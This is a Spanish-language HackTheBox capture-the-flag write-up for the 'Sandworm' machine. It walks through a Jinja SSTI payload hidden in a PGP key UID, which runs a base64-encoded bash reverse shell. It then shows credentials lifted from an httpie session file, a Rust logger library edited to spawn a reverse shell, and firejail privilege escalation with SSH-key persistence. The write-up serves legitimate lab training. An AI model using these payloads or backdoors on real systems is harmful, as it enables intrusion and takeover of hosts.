---
layout: default
title: Sandworm
parent: HackTheBox
grand_parent: Writeups
---

# Sandworm
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Tenemos un sitio web el cual nos permite realizar varias operaciones con claves PGP, donde descubriremos que el campo UID es vulnerable a **SSTI** con el que conseguiremos RCE, despues haremos movimiento lateral de atlas --> silentobserver via **firejail scape**, despues otro movimiento laterial de silentobserver --> atlas, modificando una libreria de Rust para ejecutar comandos y mandarnos una rev shell, y para la escalada de privilegios explotaremos una vulnerabilidad de firejail donde necesitaremos dos conexiones como Atlas para explotarla.

{:.lead}

## Enumeracion

Iniciamos con un escaneo de nmap con:

```ruby
nmap -sS -n -Pn -T4 --open -p- 10.10.11.152
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

Y nos reporto que hay varios puertos abiertos:

```ruby
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo esos puertos:

```ruby
nmap -sCV -p22,80,443 10.10.11.218
```

```ruby
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En el puerto 22 no vamos a poder hacer nada sin credenciales, y el puerto 80 nos redirige a **ssa.htb**, asi que hay que agregarlo al **etc/hosts**:

```ruby
echo "10.10.11.218     ssa.htb" | tee -a /etc/hosts
```

### Fuzzing de directorios

Podemos usar wffuzz para enumerar directorios mediante fuerza bruta:

```ruby
wfuzz -u 'https://ssa.htb/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=404,405
```

Vamos a descubrir varios:

- view
- about
- login
- logout
- contact
- admin
- guide
- pgp

### Explorando ssa.htb

Al explorar el home, hay algo que llama la atencion, que esta usando flask:

![](/assets/img/sandworm/1.png)

Una vulnerabilidad comun en flask es **SSTI**(Server Side Template Injection)

En el directorio **contact** si leemos, nos dice que podemos subir un texto cifrado usando PGP

![](/assets/img/sandworm/2.png)

En la parte de hasta abajo nos dice: **Don't know how to use PGP? Check out our guide** y tiene un hipervinculo, si le damos click, nos llevara al directorio **/guide** donde podemos hacer varias cosas con PGP, como cifrar y decifrar texto.

Tambien donde dice: **Practice by importing our public key and encrypting, signing, and verifying messages.** tenemos otro hipervinculo que nos lleva a **/pgp**, que nos muestra una clave publica PGP.

Entonces recapitulando, tenemos:

- **/contact**: Nos permite enviar un texto cifrado con PGP
- **/guide**: Nos permite cifrar y desifrar texto, asi como verificar la firma de un texto
- **/pgp**: Nos proporcionar una clave PGP publica

### Explorando funciones

Debido a que el sitio web reliza operaciones con claves PGP, podemos generar las nuestras, en mi caso usare **GPG** y me guiare de [aqui](https://itslinuxfoss.com/generate-pgp-keys-with-gpg/)

Como nomas es algo rapido, usare **–quick-gen-key** que solo ocupa el UID (user id)

```ruby
gpg --quick-gen-key c4rta
```

Ahora exportaremos la clave a un archivo:

```ruby
gpg --armor --export c4rta | sponge pubkey.asc
```

Y despues firmamos un texto que puede ser cual sea:

```ruby
echo 'nazuna besto waifu' | gpg --clear-sign
```

Regresando al sitio web, en esta parte

![](/assets/img/sandworm/3.png)

Del lado derecho copiamos el contenido de la clave que generamos  (pubkey.asc), y el lado izquierdo el mensaje firmado

Y tendremos una salida como esta

![](/assets/img/sandworm/4.png)

Tenemos cosas, observa que el UID que pusimos cuando se genero le key, se muestra en el resultado, en mi caso el UID que puse fue **c4rta** y se ve reflejado

## SSTI (Server Side Template Injection)

SSTI significa **inyeccion de plantillas del lado del servidor**, y es una vulnerabilidad que permite a los atacantes inyectar plantillas maliciosas en un motor de plantillas, la cual sera renderizada por el servidor, esto con el fin de ejecutar comandos del lado del servidor, de ahi su nombre **Server Side**, si quieres saber mas sobre SSTI, te recomiendo ver un post que le dedique --> [SSTI](https://ic4rta.github.io/2023/05/29/UPDP-ssti/)

Una vez sabiendo que es SSTI, lo que podriar estar pasando es que la funcion que se encarga de verificar la firma y el  motor de plantillas, estan procesando la informacion que le pasamos por el UID e inyecta esa informacion en la plantilla, despues la renderiza y la muestra en el sitio web.

Como sabemos que el UID es posiblemente el atributo vulnerable, editaremos la clave y su UID

```ruby
gpg --edit-key c4rta
```

Usamos **adduid** para modificar el UID

Cuando nos pida el Real name, ingresaremos el payload SSTI a probar: en mi caso: **{\{7*7}}**

Deberia quedar algo asi si todo va bien

![](/assets/img/sandworm/5.png)

Despues ingresamos **trust** a ingresamos la opcion **5**

Despues de esto nos van aparecer dos UID, como se ve en la imagen, el numero entre parentesis es su indentificador

![](/assets/img/sandworm/6.png)

Ahora selecionaremos el UID viejo, en mi caso **c4rta**

```ruby
uid 1
```

Y lo eliminamos

```ruby
deluid
```

Ahora solo nos debe de quedar un UID que es el que tiene el payload

![](/assets/img/sandworm/7.png)

Para terminar le damos **save** para guardar cambios, volvemos a generar la clave, firmamos un texto y probamos en el sitio web

```ruby
gpg --armor --export "{\{7*7}} <c4rta@email.com>" | sponge pubkey.asc
```

```ruby
echo 'nazuna besto waifu' | gpg --clear-sign
```

Observa como en la respuesta sale un **49**

![](/assets/img/sandworm/8.png)

Eso quiere decir que la operacion se realizo por que el motor de plantillas proceso el payload e inyecto el resultado en la plantilla para luego mostrarlo en el sitio web, y con eso confirmamos que es vulnerable a **SSTI**


Ahora haremos lo mismo de modificar el UID, generar la clave, etc, para conseguir RCE y tener una rev shell


```ruby
echo "bash -c 'bash -i >& /dev/tcp/<tu IP>/444 0>&1'" | base64
```

Y el payload queda asi:

![](/assets/img/sandworm/10.png)

\{\{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NS80NDQgMD4mMScK" | base64 -d | bash').read() }}


Lo probramos y nos llega una rev shell

![](/assets/img/sandworm/9.png)

## Movimiento lateral: atlas --> silentobserver (firejail scape) y flag de user

Si probamos con varios comandos, vamos a ver que no nos deja

![](/assets/img/sandworm/11.png)

Esto es un caso tipico de que estemos en un sandbox y comunmente es **firejail**.

Si nos vamos al directorios del usuario **atlas** vamos a poder ver que se encuentra un directorio **.config**

```ruby
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
```

Donde estaran otros dos directorios

```ruby
dr-------- 2 nobody nogroup   40 Sep 10 11:11 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15  2023 httpie
```

Viendo los permisos y grupos, al unico que vamos a poder entrar es al **httpie**

Explorando mas, en el directorio: **/home/atlas/.config/httpie/sessions/localhost_5000** encontraremos un archivo **admin.json** con unas credenciales para el usuario **silentobserver**

- **usr**: silentobserver
- **pass**: quietLiketheWind22

Como tenemos el SSH abierto, las probaremos ahi

Y ya tenemos la flag de user:

```ruby
silentobserver@sandworm:~$ ls
lib.rs  user.txt
```

## Movimiento lateral: silentobserver --> atlas

Buscando por binarios SUID encontramos uno que no parece comun

```ruby
find / -perm -u=s -type f 2>/dev/null
```
```ruby
/opt/tipnet/target/debug/tipnet
```

Adicionalmente podemos ver que ese binario se esta ejecutando:

```ruby
silentobserver@sandworm:~$ ps -aux | grep -i tipnet
silento+   73007  0.0  0.0   6608  2412 pts/0    S+   16:59   0:00 grep --color=auto -i tipnet
```

Viendo el contenido del directorio, es obvio que es un proyecto de Rust:

```ruby
drwxrwxr-x   7 root  atlas     4096 Sep 10 12:06 ./
drwxr-xr-x   3 root  atlas     4096 Jun  6 11:49 ../
drwxrwxr-x 142 atlas atlas    12288 Jun  6 11:49 build/
-rwxrwxr--   1 root  atlas        0 Feb  8  2023 .cargo-lock*
drwxrwxr-x   2 atlas atlas    69632 Sep 10 12:06 deps/
drwxrwxr-x   2 atlas atlas     4096 Jun  6 11:49 examples/
drwxrwxr-- 472 root  atlas    24576 Jun  6 11:49 .fingerprint/
drwxrwxr-x   6 atlas atlas     4096 Jun  6 11:49 incremental/
-rwsrwxr-x   2 atlas atlas 59047248 Sep 10 12:06 tipnet*
-rw-rw-r--   1 atlas atlas       87 May  4 17:24 tipnet.d
```
En el directorio: **/opt/tipnet/src** vamos a poder encontrar el codigo fuente el archivo.

Basicamente el codigo lo que hace es interactuar con una base de datos usando **upstream** y **pull** y manipula archivos.

Sin embargo, podemos ver que esta haciendo uso de una libreria externa: **extern crate logger;**, esto es interesante por que no la esta importando desde internet, si no desde la maquina, asi que de debe de encontrar en algun lugar del proyecto. Buscando un poco, la ruta en la que se encuentra es en: **/opt/crates/logger/src**

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Si vemos sus permisos, en la parte de grupo nos dice que hay permisos de lectura y escritura para el grupo **silentobserver**:

```ruby
-rw-rw-r-- 1 atlas silentobserver  732 May  4 17:12 lib.rs
```

Y nosotros somos de ese grupo:

```ruby
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

Sabiendo que la libreria se manda a llamar en el binario **tipnet**, y ese binario se ejecuta como **Atlas**, podemos modificar el codigo de la libreria para ejecutar un comando y que nos de una rev shell.

Y esto podria ser un: **Rust library hijacking (RW permissions)**.

Vamos a modificar el codigo para que ejecute un comando:

```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/<tu IP>/444 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("ERROR");

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Despues de un ratito nos llega la rev shell

![](/assets/img/sandworm/12.png)


## Escalada de privilegios

Si buscamos por biarios SUID podemos ver uno de firejail

```ruby
/usr/local/bin/firejail
```

Ah este punto toca buscar en google exploits de firejail que nos permitan escalar privilegios, y encontre este: [https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25)

Antes de ejecurlo, necesitamos tener otra conexion como Atlas, lo mas sencillo es tener nuestra id_rsa.pub como authorized_keys en el directorio .ssh de Atlas (tipico mecanismo de persistencia por SSH), y ahora si podemos ejecutarlo y seguir los pasos que nos dice y ya seremos root:

![](/assets/img/sandworm/13.png)

Eso ha sido todo, gracias por leer ❤


